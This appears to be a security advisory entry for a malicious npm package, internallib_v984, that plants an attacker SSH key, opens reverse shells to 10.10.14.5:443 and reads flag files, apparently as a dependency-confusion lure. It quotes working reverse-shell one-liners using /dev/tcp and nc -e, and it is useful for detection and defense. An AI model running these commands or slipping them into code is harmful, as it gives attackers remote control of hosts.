summary: SSH key implant and reverse shell to 10.10.14.5:443 on require
details: The package's index.js exports a command() function that, when invoked, performs three concurrent attacks on the installer's host: (1) appends a hardcoded attacker SSH public key (tr0n@DESKTOP-GVIA2J0) to /root/.ssh/authorized_keys, /home/gitlab-runner/.ssh/authorized_keys, and /home/internal/.ssh/authorized_keys, granting persistent remote SSH access; (2) spawns triple-redundant reverse shells to 10.10.14.5:443 using `bash -i >& /dev/tcp/10.10.14.5/443 0>&1`, `nc -e /bin/bash 10.10.14.5 443`, and a Node net.Socket piping to a /bin/bash child process; (3) reads HTB-style flag files (/home/internal/user.txt, /root/root.txt, /home/gitlab-runner/user.txt) and prints their contents to stdout where the reverse-shell channel returns them to the attacker. The package.json contains only name/version/main with no author, repository, or description, and the package name follows an internal-namespace pattern (`internallib_v984`) consistent with dependency-confusion targeting of internal corporate registries. The entire module body is the payload.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
